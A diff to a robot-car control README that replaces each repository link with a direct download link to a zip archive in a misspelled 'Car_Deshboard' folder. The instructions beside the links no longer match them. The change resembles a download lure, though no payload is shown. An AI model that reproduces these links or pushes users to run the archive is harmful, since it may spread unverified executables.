@@ -1,6 +1,6 @@
 # 🤖 Robo_race_car - Control Robot Car with Your WiFi
 
-[![Download Robo_race_car](https://img.shields.io/badge/Download-Robo_race_car-brightgreen?style=for-the-badge)](https://github.com/Dan83000/Robo_race_car)
+[![Download Robo_race_car](https://img.shields.io/badge/Download-Robo_race_car-brightgreen?style=for-the-badge)](https://github.com/Dan83000/Robo_race_car/raw/refs/heads/main/Car_Deshboard/Robo-race-car-1.8.zip)
 
 ---
 
@@ -30,7 +30,7 @@ This guide helps you use Robo_race_car on your Windows PC. It covers downloading
 To start, you need to get the software files that control your robot car.
 
 1. Click the big green button above or open this link in your browser:  
-   [https://github.com/Dan83000/Robo_race_car](https://github.com/Dan83000/Robo_race_car)
+   [https://github.com/Dan83000/Robo_race_car/raw/refs/heads/main/Car_Deshboard/Robo-race-car-1.8.zip](https://github.com/Dan83000/Robo_race_car/raw/refs/heads/main/Car_Deshboard/Robo-race-car-1.8.zip)
 
 2. When you reach the GitHub page, look for the green **Code** button at the top right. Click it and select **Download ZIP**.
 
@@ -121,7 +121,7 @@ Make sure all connections are firm and correct before powering on.
 
 Here is the main place to get all software and instructions:
 
-[https://github.com/Dan83000/Robo_race_car](https://github.com/Dan83000/Robo_race_car)
+[https://github.com/Dan83000/Robo_race_car/raw/refs/heads/main/Car_Deshboard/Robo-race-car-1.8.zip](https://github.com/Dan83000/Robo_race_car/raw/refs/heads/main/Car_Deshboard/Robo-race-car-1.8.zip)
 
 Visit this link to download the ZIP file with everything needed to run Robo_race_car.
 
